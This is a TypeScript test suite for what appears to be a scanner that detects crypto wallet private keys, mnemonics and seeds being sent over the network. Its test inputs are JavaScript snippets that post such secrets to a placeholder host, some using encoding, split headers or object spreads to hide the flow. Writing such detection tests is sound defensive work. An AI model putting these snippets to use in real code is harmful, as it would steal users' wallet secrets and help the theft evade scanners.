import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { findSecretExfiltration, hasSecretFlowCandidate } from '../src/scanner/content-secret-flow.js';

const endpoint = "'https://example.test/telemetry'";
const find = (source: string) => {
  if (findSecretExfiltration(source)) assert.equal(hasSecretFlowCandidate(source), true);
  return findSecretExfiltration(source);
};
describe('private material flowing to network payloads', () => {
  it('links direct key fields, quoted fields and mnemonic parameters to outgoing bytes', () => {
    assert.ok(find(`fetch(${endpoint}, {body: wallet.privateKey});`));
    assert.ok(find(`fetch(${endpoint}, {headers: {'x-debug': wallet['secretKey']}});`));
    assert.ok(find(`function send(mnemonic) { fetch(${endpoint}, {body: mnemonic}); }`));
    assert.ok(find(`fetch(${endpoint}, {body: generateMnemonic()});`));
    assert.ok(find(`fetch(${endpoint}, {body: wallet.MNEMONIC});`));
    assert.ok(find(`fetch(${endpoint}, {body: wallet['mnemo'+'nic']});`));
  });
  it('recognizes a cryptographic seed generator through a bundled module binding', () => {
    assert.ok(find(`const keypairs = __webpack_require__('node_modules/ripple-keypairs/dist/index.js'); const seed = (0, keypairs.generateSeed)(); fetch(${endpoint}, {headers: {'x-debug': seed}});`));
    assert.equal(find(`const seed = randomSeed(); fetch(${endpoint}, {body: seed});`), undefined);
    assert.equal(find(`fetch(${endpoint}, {body: config.seed});`), undefined);
  });
  it('connects static helper parameters through encoding and split header values', () => {
    const source = `class Transport { static queue(data) { const b=bs58.encode(data); fetch(${endpoint}, {headers: {'x-one':b.substring(0,24).split('').reverse().join(''), 'x-two':b.substring(24)}}); } } Transport.queue(wallet._secretKey);`;
    const signal = find(source);
    assert.ok(signal);
    assert.ok(source.slice(signal.start, signal.end).startsWith('queue('));
    assert.ok(source.slice(signal.sinkStart, signal.sinkEnd).startsWith('fetch('));
  });
  it('connects named helper functions but keeps same-named unrelated scopes separate', () => {
    assert.ok(find(`function send(data){ const body=Buffer.from(data).toString('base64'); fetch(${endpoint},{body}); } send(privateKey);`));
    assert.equal(find(`function left(){function send(data){fetch(${endpoint},{body:data});}} function right(){send(privateKey);}`,), undefined);
    assert.equal(find(`function send(data){fetch(${endpoint},{body:data});} function local(send){send(privateKey);}`), undefined);
  });
  it('honors overwritten and shadowed local values', () => {
    assert.equal(find(`let data=wallet.secretKey; data='public'; fetch(${endpoint},{body:data});`), undefined);
    assert.equal(find(`const data=wallet.secretKey; function report(data){fetch(${endpoint},{body:data});} report('public');`), undefined);
    assert.equal(find(`function work(fetch){fetch(${endpoint},{body:privateKey});}`), undefined);
    assert.equal(find(`function send(data){fetch(${endpoint},{body:data});} send=logger; send(privateKey);`), undefined);
    assert.equal(find(`const first=1, privateKey='placeholder'; fetch(${endpoint},{body:privateKey});`), undefined);
    assert.equal(find(`const data=wallet.secretKey; items.map(data=>fetch(${endpoint},{body:data}));`), undefined);
    assert.equal(find(`const data=wallet.secretKey; items.map((data)=>fetch(${endpoint},{body:data}));`), undefined);
    assert.equal(find(`const data=wallet.secretKey; items.map(data=>{fetch(${endpoint},{body:data});});`), undefined);
    assert.equal(find(`const {unrelated:privateKey}=config; fetch(${endpoint},{body:privateKey});`), undefined);
    assert.equal(find(`const data=wallet.secretKey; function report({data}){fetch(${endpoint},{body:data});}`), undefined);
    assert.equal(find(`const data=wallet.secretKey; items.map(({data})=>fetch(${endpoint},{body:data}));`), undefined);
    assert.equal(find(`let data=wallet.secretKey; data=JSON.stringify([${Array(300).fill("'public'").join(',')}]); fetch(${endpoint},{body:data});`), undefined);
    assert.equal(find(`let data=wallet.secretKey; data &&= 'public'; fetch(${endpoint},{body:data});`), undefined);
  });
  it('does not associate unrelated private data with public RPC or telemetry', () => {
    assert.equal(find(`const privateKey=wallet.secretKey; const pub=getPublicKey(privateKey); fetch(${endpoint},{body:JSON.stringify({publicKey:pub})});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:wallet.publicKey});`), undefined);
    assert.equal(find(`const signature=sign(message,privateKey); fetch(${endpoint},{body:signature});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:hash(privateKey).digest('hex')});`), undefined);
    assert.equal(find(`fetch(${endpoint},{headers:{Authorization:apiToken},signer:privateKey});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:privateKey.length});`), undefined);
    assert.equal(find(`const wallet={privateKey:'redacted'}; fetch(${endpoint},{body:wallet.privateKey});`), undefined);
    assert.equal(find(`const wallet={privateKey:hash(raw.privateKey)}; fetch(${endpoint},{body:wallet.privateKey});`), undefined);
    assert.equal(find(`const original={privateKey:'redacted'}; const wallet=original; fetch(${endpoint},{body:wallet['privateKey']});`), undefined);
    assert.ok(find(`const wallet={privateKey:raw.privateKey}; fetch(${endpoint},{body:wallet.privateKey});`));
  });
  it('invalidates object snapshots and static helper summaries after property writes', () => {
    assert.equal(find(`const wallet={privateKey:raw.secretKey}; wallet.privateKey='redacted'; fetch(${endpoint},{body:wallet.privateKey});`), undefined);
    assert.equal(find(`const wallet={privateKey:raw.secretKey}; wallet['privateKey']='redacted'; fetch(${endpoint},{body:wallet.privateKey});`), undefined);
    assert.equal(find(`const wallet={privateKey:raw.secretKey}; const alias=wallet; alias.privateKey='redacted'; fetch(${endpoint},{body:wallet.privateKey});`), undefined);
    assert.equal(find(`const wallet={privateKey:raw.secretKey}; const alias=wallet; wallet.privateKey='redacted'; fetch(${endpoint},{body:alias.privateKey});`), undefined);
    assert.equal(find(`const options={body:raw.secretKey}; options.body='redacted'; fetch(${endpoint},options);`), undefined);
    assert.equal(find(`const wallet={privateKey:raw.secretKey}; wallet.privateKey='redacted'; fetch(${endpoint},{body:JSON.stringify(wallet)});`), undefined);
    assert.equal(find(`class Transport {static queue(data){fetch(${endpoint},{body:data});}} Transport.queue=console.log; Transport.queue(wallet.privateKey);`), undefined);
    assert.ok(find(`class Transport {static queue(data){fetch(${endpoint},{body:data});}} Transport.count=0; Transport.queue(wallet.privateKey);`));
  });
  it('uses the final duplicate field in options, headers and nested serialized objects', () => {
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,body:'redacted'});`), undefined);
    assert.equal(find(`fetch(${endpoint},{headers:{'x-key':wallet.privateKey},headers:{'x-key':'redacted'}});`), undefined);
    assert.equal(find(`fetch(${endpoint},{headers:{'x-key':wallet.privateKey,'x-key':'redacted'}});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:JSON.stringify({nested:{privateKey:wallet.privateKey,privateKey:'redacted'}})});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,['body']:'redacted'});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,get body(){return 'redacted';}});`), undefined);
    assert.ok(find(`fetch(${endpoint},{body:'redacted',body:wallet.privateKey});`));
    assert.ok(find(`fetch(${endpoint},{body:JSON.stringify({nested:{privateKey:'redacted',privateKey:wallet.privateKey}})});`));
    assert.ok(find(`fetch(${endpoint},{headers:{'x-key':'redacted','x-key':wallet.privateKey}});`));
  });
  it('resolves bounded literal and local-object spreads in source order', () => {
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,...{body:'redacted'}});`), undefined);
    assert.equal(find(`const publicOptions={body:'redacted'}; fetch(${endpoint},{body:wallet.privateKey,...publicOptions});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:JSON.stringify({nested:{privateKey:wallet.privateKey,...{privateKey:'redacted'}}})});`), undefined);
    assert.equal(find(`fetch(${endpoint},{headers:{'x-key':wallet.privateKey,...{'x-key':'redacted'}}});`), undefined);
    assert.ok(find(`fetch(${endpoint},{body:'redacted',...{body:wallet.privateKey}});`));
    assert.ok(find(`const secretOptions={body:wallet.privateKey}; fetch(${endpoint},{...secretOptions});`));
    assert.ok(find(`fetch(${endpoint},{body:JSON.stringify({nested:{...{privateKey:wallet.privateKey},publicKey:'public'}})});`));
  });
  it('preserves unknown accessor and method overwrites across object spreads', () => {
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,...{get body(){return 'redacted';}}});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,...{body(){return 'redacted';}}});`), undefined);
    assert.equal(find(`const redacted={get body(){return 'redacted';}}; fetch(${endpoint},{body:wallet.privateKey,...redacted});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:JSON.stringify({privateKey:wallet.privateKey,...{get privateKey(){return 'redacted';}}})});`), undefined);
    assert.equal(find(`fetch(${endpoint},{headers:{'x-key':wallet.privateKey,...{get 'x-key'(){return 'redacted';}}}});`), undefined);
    assert.ok(find(`fetch(${endpoint},{...{get body(){return 'redacted';}},body:wallet.privateKey});`));
    assert.ok(find(`fetch(${endpoint},{...{body(){return 'redacted';}},body:wallet.privateKey});`));
    assert.ok(find(`fetch(${endpoint},{body:JSON.stringify({...{get privateKey(){return 'redacted';}},privateKey:wallet.privateKey})});`));
  });
  it('drops evidence before unknown overwrites while retaining later explicit fields', () => {
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,...options});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,...{...options,method:'POST'}});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:wallet.privateKey,[field]:'redacted'});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:JSON.stringify({privateKey:wallet.privateKey,...options})});`), undefined);
    assert.ok(find(`fetch(${endpoint},{...options,body:wallet.privateKey});`));
    assert.ok(find(`fetch(${endpoint},{body:'redacted',...{...options,body:wallet.privateKey}});`));
    assert.ok(find(`fetch(${endpoint},{[field]:'redacted',body:wallet.privateKey});`));
  });
  it('ignores comments, quoted examples, local method names and parameter keywords', () => {
    assert.equal(find(`// fetch(${endpoint},{body:privateKey})`), undefined);
    assert.equal(find(`const text="fetch('https://example.test',{body:privateKey})";`), undefined);
    assert.equal(find(`storage.fetch(${endpoint},{body:privateKey});`), undefined);
    assert.equal(find(`fetch(${endpoint},{body:{privateKey:'redacted'}});`), undefined);
  });
});
